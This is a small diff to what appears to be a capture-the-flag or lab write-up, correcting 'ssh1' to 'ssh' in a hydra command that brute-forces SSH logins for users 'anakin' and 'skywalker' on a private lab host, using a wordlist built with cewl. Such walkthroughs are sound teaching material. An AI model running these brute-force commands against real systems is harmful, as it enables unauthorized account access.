@@ -101,7 +101,7 @@ cewl http://10.38.1.114/r2d2 -w passwords.txt
 Now that we have a list of passwords we can use this command to brute force our way through logging in using `SSH` with our two users.
 
 ```
-hydra -l anakin -P ./passwords.txt 10.38.1.114 -t 4 ssh1
+hydra -l anakin -P ./passwords.txt 10.38.1.114 -t 4 ssh
 ```
 
 The results for the user `anakin` didn't return any results but running that same command for the user `skywalker` gives us this result:
